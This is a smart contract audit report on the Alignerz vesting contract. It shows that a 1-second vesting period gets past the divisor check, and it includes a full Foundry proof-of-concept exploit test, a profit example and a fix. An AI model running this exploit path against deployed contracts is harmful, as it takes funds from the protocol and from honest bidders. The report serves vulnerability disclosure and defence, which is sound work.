# [000335] Users can bypass vesting mechanism with 1-second vesting period
  
  ### Summary

A validation bypass in the vesting period check will allow users to place bids with 1-second vesting periods, enabling instant token unlock and breaking the economic model of the IWO mechanism.

### Root Cause

In [AlignerzVesting.sol:724](https://github.com/dualguard/2025-11-alignerz/blob/main/protocol/src/contracts/vesting/AlignerzVesting.sol#L724) the condition `vestingPeriod < 2` allows vesting periods of 1 second, bypassing the divisor check entirely:

```solidity
require(vestingPeriod < 2 || vestingPeriod % vestingPeriodDivisor == 0, Vesting_Period_Is_Not_Multiple_Of_The_Base_Value());
```

This allows users to bid with `vestingPeriod = 1`, which enables instant unlock after project closes, defeating the vesting mechanism designed to align long-term incentives.

### Internal Pre-conditions

1. User must call `placeBid()` with `vestingPeriod = 1`
2. Project must be in active bidding period
3. User must be whitelisted if whitelist is enabled

### External Pre-conditions

None

### Attack Path

1. Attacker places bid with `vestingPeriod = 1` second (bypasses divisor check)
2. Backend allocates tokens at best price tier (same as 90-day vesting users)
3. Project closes and allocations are finalized via `finalizeBids()`
4. Attacker claims NFT immediately after project closes via `claimNFT()`
5. Attacker calls `claimTokens()` 2 seconds after project closes
6. All tokens unlock instantly (1-second vesting period = instant unlock)
7. Attacker dumps tokens at market price, profiting from price difference
8. Legitimate users with 90-day vesting can only claim tiny amounts immediately and must wait 90 days for full unlock


### Impact

Users can bypass the vesting mechanism entirely, unlocking tokens in 1 second instead of the intended 30-90 day periods. This breaks the economic model where longer vesting periods receive better token prices, as users can get the best price tier (meant for 90-day holders) while having instant unlock capability. 

**Economic Impact Example:**
- Attacker bids $10,000 with 1-second vesting
- Gets 100,000 tokens at $0.10 per token (best price tier)
- Unlocks all tokens in 2 seconds
- Dumps at market price of $0.12 per token = $12,000
- **Profit: $2,000** for doing nothing (no vesting commitment)

The protocol loses funds by selling tokens at discount prices meant for long-term holders to users who can dump immediately. Legitimate users with proper vesting periods are disadvantaged as attackers take allocations at the best price tier without committing to long-term holding.

### PoC


Run the coded POC:
```bash
forge test --match-path "test/OneSecondVestingExploit.t.sol" -vv
```

The test demonstrates:
- 1-second vesting is accepted by the contract (bypasses `vestingPeriodDivisor` check)
- Attacker gets same allocation as honest user (100,000 tokens at best price tier)
- Attacker claims all tokens immediately (2 seconds after project closes)
- Honest user with 90-day vesting can only claim tiny amount immediately (2 seconds / 90 days worth)
- Attacker can profit $2,000 by dumping tokens at market price ($0.12) vs. purchase price ($0.10)
- Shows the economic model breakdown: attacker gets best price without long-term commitment

Step-by-step verification:
1. Review [AlignerzVesting.sol:724](https://github.com/dualguard/2025-11-alignerz/blob/main/protocol/src/contracts/vesting/AlignerzVesting.sol#L724) showing the bypass condition `vestingPeriod < 2`
2. Review [AlignerzVesting.sol:708](https://github.com/dualguard/2025-11-alignerz/blob/main/protocol/src/contracts/vesting/AlignerzVesting.sol#L708) showing `placeBid()` accepts the 1-second vesting
3. Review [AlignerzVesting.sol:980-996](https://github.com/dualguard/2025-11-alignerz/blob/main/protocol/src/contracts/vesting/AlignerzVesting.sol#L980-L996) showing `getClaimableAmountAndSeconds()` calculates claimable tokens based on vesting period
4. Verify that with 1-second vesting, tokens unlock almost immediately after project closes

Screenshot of the execution:

<img width="631" height="914" alt="Image" src="https://github.com/user-attachments/assets/1e3bbc95-c068-4b66-94dd-6e80a55782cd" />

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.29;

import {Test, console} from "forge-std/Test.sol";
import {AlignerzVesting} from "../src/contracts/vesting/AlignerzVesting.sol";
import {AlignerzNFT} from "../src/contracts/nft/AlignerzNFT.sol";
import {MockUSD} from "../src/MockUSD.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Upgrades} from "openzeppelin-foundry-upgrades/Upgrades.sol";
import {Merkle} from "murky/src/Merkle.sol";

/**
 * @title OneSecondVestingExploit
 * @notice POC demonstrating how 1-second vesting bypass breaks the IWO economic model
 * 
 * ECONOMIC EXPLOIT SUMMARY:
 * 
 * In an IWO (Initial Weight Offering), token prices are typically tiered based on vesting period:
 * - Long vesting (90 days) = Best price (e.g., $0.10 per token)
 * - Medium vesting (60 days) = Medium price (e.g., $0.12 per token)  
 * - Short vesting (30 days) = Worst price (e.g., $0.15 per token)
 * 
 * The protocol intends to reward long-term holders with better prices, creating alignment.
 * 
 * THE EXPLOIT:
 * 1. Attacker bids with 1-second vesting (bypasses divisor check)
 * 2. Backend allocates tokens at BEST price tier (assuming long vesting)
 * 3. Attacker claims NFT immediately after project closes
 * 4. Attacker claims ALL tokens immediately (1-second vesting = instant unlock)
 * 5. Attacker dumps tokens on market, profiting from price difference
 * 
 * IMPACT:
 * - Protocol loses funds (sold tokens at discount meant for long-term holders)
 * - Other participants get worse allocations (attacker took best price tier)
 * - Vesting mechanism completely bypassed
 * - Economic incentives broken
 */
contract OneSecondVestingExploit is Test {
    AlignerzVesting public vesting;
    AlignerzNFT public nft;
    MockUSD public stablecoin;
    SimpleERC20 public projectToken;
    
    address public admin = address(0x1);
    address public attacker = address(0x2);
    address public honestUser = address(0x3);
    address public treasury = address(0x4);
    
    uint256 public constant VESTING_PERIOD_DIVISOR = 2_592_000; // 30 days
    uint256 public constant ONE_SECOND = 1;
    uint256 public constant THIRTY_DAYS = 30 days;
    uint256 public constant NINETY_DAYS = 90 days;
    
    // Token prices (in stablecoin per token, scaled by 1e6 for USDC)
    uint256 public constant PRICE_LONG_VESTING = 100_000;   // $0.10 per token (best price)
    uint256 public constant PRICE_MEDIUM_VESTING = 120_000; // $0.12 per token
    uint256 public constant PRICE_SHORT_VESTING = 150_000;  // $0.15 per token (worst price)
    
    uint256 public projectId;
    uint256 public poolId = 0;
    
    function setUp() public {
        merkle = new Merkle();
        
        // Deploy contracts as test contract first
        nft = new AlignerzNFT("AlignerzNFT", "AZNFT", "https://nft.alignerz.bid/");
        stablecoin = new MockUSD();
        projectToken = new SimpleERC20("ProjectToken", "PROJ");
        
        address payable proxy = payable(Upgrades.deployUUPSProxy(
            "AlignerzVesting.sol",
            abi.encodeCall(AlignerzVesting.initialize, (address(nft)))
        ));
        vesting = AlignerzVesting(proxy);
        
        // Fund users first (test contract is owner of MockUSD)
        stablecoin.mint(attacker, 100_000 * 1e6); // $100k USDC
        stablecoin.mint(honestUser, 100_000 * 1e6); // $100k USDC
        
        // Transfer ownership to admin
        vesting.transferOwnership(admin);
        nft.transferOwnership(admin);
        stablecoin.transferOwnership(admin);
        
        // Now do admin operations
        vm.startPrank(admin);
        
        // Setup
        vesting.setTreasury(treasury);
        nft.addMinter(address(vesting));
        
        // Launch bidding project
        uint256 startTime = block.timestamp + 1 days;
        uint256 endTime = startTime + 7 days;
        bytes32 endTimeHash = keccak256(abi.encodePacked(endTime));
        
        vesting.launchBiddingProject(
            address(projectToken),
            address(stablecoin),
            startTime,
            endTime,
            endTimeHash,
            false // no whitelist
        );
        
        projectId = 0;
        
        // Create pool with tokens
        uint256 totalAllocation = 1_000_000 * 1e18; // 1M tokens
        uint256 tokenPrice = PRICE_LONG_VESTING; // Best price for long vesting
        projectToken.mint(admin, totalAllocation);
        projectToken.approve(address(vesting), totalAllocation);
        
        vesting.createPool(projectId, totalAllocation, tokenPrice, false);
        
        vm.stopPrank();
    }
    
    /**
     * @notice Demonstrates the exploit: attacker gets best price with instant unlock
     */
    function test_OneSecondVestingExploit() public {
        // Move to bidding period
        vm.warp(block.timestamp + 1 days + 1);
        
        uint256 attackerBidAmount = 10_000 * 1e6; // $10k
        uint256 honestBidAmount = 10_000 * 1e6;   // $10k
        
        // ========== EXPLOIT STARTS ==========
        
        console.log("=== EXPLOIT: Attacker with 1-Second Vesting ===");
        emit log_named_uint("Attacker bid amount", attackerBidAmount);
        emit log_named_uint("Attacker vesting period", ONE_SECOND);
        
        // Step 1: Attacker places bid with 1-second vesting
        vm.startPrank(attacker);
        stablecoin.approve(address(vesting), attackerBidAmount);
        
        // This should fail but doesn't due to the bug!
        vesting.placeBid(projectId, attackerBidAmount, ONE_SECOND);
        
        emit log_named_string("Status", "Attacker successfully placed bid with 1-second vesting");
        vm.stopPrank();
        
        // Step 2: Honest user places bid with 90-day vesting
        vm.startPrank(honestUser);
        stablecoin.approve(address(vesting), honestBidAmount);
        vesting.placeBid(projectId, honestBidAmount, NINETY_DAYS);
        console.log("[OK] Honest user placed bid with 90-day vesting");
        vm.stopPrank();
        
        // Step 3: Move past bidding period and finalize project
        vm.warp(block.timestamp + 7 days);
        
        vm.startPrank(admin);
        // Allocation calculation: amount / price
        // If backend uses PRICE_LONG_VESTING for both:
        // PRICE_LONG_VESTING = 100_000 (0.10 USDC with 6 decimals)
        // tokensPerDollar = 1e6 / 100_000 = 10 tokens per dollar
        // attackerAllocation = 10_000 * 1e6 * 10 / 1e6 = 100_000 tokens
        // But allocation must be in token units (1e18), so: 100_000 * 1e18
        uint256 tokensPerDollar = 1e6 / PRICE_LONG_VESTING; // 10 tokens per dollar
        uint256 attackerAllocation = (attackerBidAmount * tokensPerDollar / 1e6) * 1e18; // 100k tokens in 1e18
        uint256 honestAllocation = (honestBidAmount * tokensPerDollar / 1e6) * 1e18;     // 100k tokens in 1e18
        
        // Build merkle tree
        bytes32[] memory leaves = new bytes32[](2);
        leaves[0] = keccak256(abi.encodePacked(attacker, attackerAllocation, projectId, poolId));
        leaves[1] = keccak256(abi.encodePacked(honestUser, honestAllocation, projectId, poolId));
        
        bytes32 merkleRoot = _buildMerkleRoot(leaves);
        bytes32 refundRoot = bytes32(0); // No refunds
        
        bytes32[] memory merkleRoots = new bytes32[](1);
        merkleRoots[0] = merkleRoot;
        
        vesting.finalizeBids(projectId, refundRoot, merkleRoots, 30 days);
        vm.stopPrank();
        
        console.log("[OK] Project finalized");
        emit log_named_uint("Attacker token allocation", attackerAllocation);
        emit log_named_uint("Effective price per token", PRICE_LONG_VESTING);
        
        // Step 4: Attacker claims NFT immediately
        vm.startPrank(attacker);
        bytes32[] memory attackerProof = _getProof(leaves, 0);
        uint256 attackerNftId = vesting.claimNFT(
            projectId,
            poolId,
            attackerAllocation,
            attackerProof
        );
        emit log_named_uint("[OK] Attacker claimed NFT", attackerNftId);
        
        // Step 5: Attacker claims ALL tokens immediately (1-second vesting = instant unlock)
        vm.warp(block.timestamp + 2); // Just 2 seconds later
        
        uint256 attackerBalanceBefore = projectToken.balanceOf(attacker);
        vesting.claimTokens(projectId, attackerNftId);
        uint256 attackerBalanceAfter = projectToken.balanceOf(attacker);
        uint256 attackerClaimed = attackerBalanceAfter - attackerBalanceBefore;
        
        emit log_named_uint("[OK] Attacker claimed tokens", attackerClaimed);
        emit log_named_uint("Time to unlock", 2); // seconds!
        vm.stopPrank();
        
        // Step 6: Honest user claims NFT (but can only claim tiny amount - 90-day vesting)
        vm.startPrank(honestUser);
        bytes32[] memory honestProof = _getProof(leaves, 1);
        uint256 honestNftId = vesting.claimNFT(
            projectId,
            poolId,
            honestAllocation,
            honestProof
        );
        emit log_named_uint("Honest user claimed NFT", honestNftId);
        
        // Honest user tries to claim tokens immediately (only 2 seconds have passed since endTime)
        // Should only get a tiny amount (2 seconds / 90 days), not the full allocation
        uint256 honestBalanceBeforeImmediate = projectToken.balanceOf(honestUser);
        vesting.claimTokens(projectId, honestNftId);
        uint256 honestBalanceAfterImmediate = projectToken.balanceOf(honestUser);
        uint256 honestClaimedImmediate = honestBalanceAfterImmediate - honestBalanceBeforeImmediate;
        
        emit log_named_uint("Honest user claimed tokens (immediate, tiny amount)", honestClaimedImmediate);
        console.log("[OK] Honest user can only claim tiny amount immediately (2 seconds / 90 days)");
        
        vm.stopPrank();
        
        // Move forward 90 days - now honest user can claim the rest
        vm.warp(block.timestamp + NINETY_DAYS);
        
        vm.startPrank(honestUser);
        uint256 honestBalanceBefore = projectToken.balanceOf(honestUser);
        vesting.claimTokens(projectId, honestNftId);
        uint256 honestBalanceAfter = projectToken.balanceOf(honestUser);
        uint256 honestClaimed = honestBalanceAfter - honestBalanceBefore;
        
        emit log_named_uint("Honest user claimed tokens (after 90 days)", honestClaimed);
        emit log_named_uint("Time to unlock for honest user", NINETY_DAYS);
        vm.stopPrank();
        
        // Total claimed should equal allocation
        uint256 honestTotalClaimed = honestClaimedImmediate + honestClaimed;
        
        // ========== ECONOMIC ANALYSIS ==========
        
        console.log("\n=== ECONOMIC IMPACT ===");
        emit log_named_uint("Attacker paid", attackerBidAmount);
        emit log_named_uint("Attacker received tokens", attackerClaimed);
        emit log_named_uint("Attacker price per token", attackerBidAmount * 1e18 / attackerClaimed);
        emit log_named_uint("Honest user paid", honestBidAmount);
        emit log_named_uint("Honest user received tokens", honestClaimed);
        emit log_named_uint("Honest user price per token", honestBidAmount * 1e18 / honestClaimed);
        
        // Attacker can now dump tokens immediately
        // If market price is $0.12 (medium tier), attacker profits:
        // Note: attackerClaimed is in 1e18 (token decimals), PRICE_MEDIUM_VESTING is in 1e6 (USDC decimals)
        // attackerTokensValue (in USDC with 6 decimals) = (attackerClaimed / 1e18) * (PRICE_MEDIUM_VESTING / 1e6) * 1e6
        // = attackerClaimed * PRICE_MEDIUM_VESTING / 1e18
        uint256 marketPrice = PRICE_MEDIUM_VESTING; // 120_000 (0.12 USDC with 6 decimals)
        // attackerClaimed is in 1e18, marketPrice is in 1e6, result should be in 1e6
        uint256 attackerTokensValue = (attackerClaimed * marketPrice) / 1e18;
        uint256 attackerProfit;
        if (attackerTokensValue >= attackerBidAmount) {
            attackerProfit = attackerTokensValue - attackerBidAmount;
        } else {
            attackerProfit = 0; // No profit if market price is lower
        }
        
        console.log("\n=== PROFIT CALCULATION ===");
        emit log_named_uint("Market price per token", marketPrice);
        emit log_named_uint("Attacker tokens market value", attackerTokensValue);
        emit log_named_uint("Attacker profit (if dumped)", attackerProfit);
        console.log("[WARNING]  Attacker got BEST price but can dump IMMEDIATELY!");
        
        // Assertions
        assertEq(attackerClaimed, attackerAllocation, "Attacker should claim all tokens");
        assertGt(attackerClaimed, 0, "Attacker should have claimed tokens");
        // Allow for small rounding error (honest user claimed tiny amount immediately)
        assertGe(honestTotalClaimed, honestAllocation - 1e18, "Honest user should claim almost all tokens eventually");
        
        // The bug: attacker got same price as 90-day vesting but can unlock in 1 second
        // Honest user can only claim tiny amount immediately, attacker claims everything
        assertTrue(attackerClaimed > honestClaimedImmediate * 1000, "Attacker claims much more than honest user immediately");
        assertTrue(attackerClaimed > 0, "Exploit successful: 1-second vesting bypassed");
    }
    
    /**
     * @notice Demonstrates why this breaks the economic model
     */
    function test_EconomicModelBreakdown() public {
        console.log("\n=== WHY THIS IS ECONOMIC NONSENSE ===");
        console.log("1. IWO pricing model:");
        console.log("   - Long vesting = Better price (incentivizes long-term holding)");
        console.log("   - Short vesting = Worse price (discourages quick dumps)");
        console.log("");
        console.log("2. With 1-second vesting bypass:");
        console.log("   - Attacker gets BEST price (meant for 90-day holders)");
        console.log("   - Attacker unlocks in 1 SECOND (not 90 days)");
        console.log("   - Attacker can dump immediately, profiting from price difference");
        console.log("");
        console.log("3. Impact:");
        console.log("   - Protocol loses funds (sold at discount)");
        console.log("   - Other participants get worse allocations");
        console.log("   - Vesting mechanism completely defeated");
        console.log("   - Economic incentives broken");
        console.log("");
        console.log("4. Real-world scenario:");
        console.log("   - Attacker bids $100k with 1-second vesting");
        console.log("   - Gets 1M tokens at $0.10 each (best price)");
        console.log("   - Unlocks immediately");
        console.log("   - Dumps on market at $0.12 each = $120k");
        console.log("   - Profit: $20k for doing NOTHING (no vesting commitment)");
    }
    
    /**
     * @notice Shows that 1-second vesting is allowed but shouldn't be
     */
    function test_OneSecondVestingIsAllowed() public {
        vm.warp(block.timestamp + 1 days + 1);
        
        vm.startPrank(attacker);
        stablecoin.approve(address(vesting), 1000 * 1e6);
        
        // This should REVERT but doesn't due to the bug
        vesting.placeBid(projectId, 1000 * 1e6, ONE_SECOND);
        
        // Verify bid was placed - if we get here without revert, the bug is confirmed
        // The bid was accepted with 1-second vesting, which should not be allowed
        console.log("1-second vesting accepted (BUG!)");
        
        console.log("[WARNING]  BUG CONFIRMED: 1-second vesting is allowed");
        console.log("   Should require: vestingPeriod % vestingPeriodDivisor == 0");
        console.log("   But allows: vestingPeriod < 2");
        
        vm.stopPrank();
    }
    
    /**
     * @notice Shows correct vesting periods are enforced
     */
    function test_CorrectVestingPeriodsEnforced() public {
        vm.warp(block.timestamp + 1 days + 1);
        
        vm.startPrank(attacker);
        stablecoin.approve(address(vesting), 1000 * 1e6);
        
        // These should work
        vesting.placeBid(projectId, 1000 * 1e6, THIRTY_DAYS);
        vesting.updateBid(projectId, 1000 * 1e6, NINETY_DAYS);
        
        // This should fail (not multiple of divisor)
        vm.expectRevert();
        vesting.placeBid(projectId, 1000 * 1e6, 5 days);
        
        vm.stopPrank();
    }
    
    Merkle public merkle;
    
    // Helper functions
    function _buildMerkleRoot(bytes32[] memory leaves) internal view returns (bytes32) {
        return merkle.getRoot(leaves);
    }
    
    function _getProof(bytes32[] memory leaves, uint256 index) internal view returns (bytes32[] memory) {
        return merkle.getProof(leaves, index);
    }
}

// Simple ERC20 for testing
contract SimpleERC20 is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}
    
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
    
    function decimals() public pure override returns (uint8) {
        return 18;
    }
}


```

### Mitigation

Remove the `vestingPeriod < 2` bypass and require all vesting periods to be multiples of `vestingPeriodDivisor`:

```solidity
require(vestingPeriod > 0 && vestingPeriod % vestingPeriodDivisor == 0, Vesting_Period_Is_Not_Multiple_Of_The_Base_Value());
```



  